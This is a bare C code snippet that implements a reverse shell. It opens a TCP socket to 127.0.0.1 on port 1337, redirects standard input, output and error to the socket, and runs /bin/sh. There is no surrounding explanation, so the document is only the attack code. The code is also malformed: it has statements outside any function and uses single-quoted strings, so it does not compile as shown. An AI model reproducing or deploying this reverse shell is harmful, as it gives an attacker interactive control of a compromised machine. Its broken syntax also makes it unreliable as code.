#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>

int s;
struct sockaddr_in hostaddr;
hostaddr.sin_family = AF_INET;
hostaddr.sin_port = htons(1337);
hostaddr.sin_addr.s_addr = inet_addr('127.0.0.1');

s = socket(AF_INET, SOCK_STREAM, 0);

connect(s, (struct sockaddr*)&hostaddr, sizeof(struct sockaddr));

dup2(s,0);
dup2(s,1);
dup2(s,2);

execve('/bin/sh', NULL, NULL);
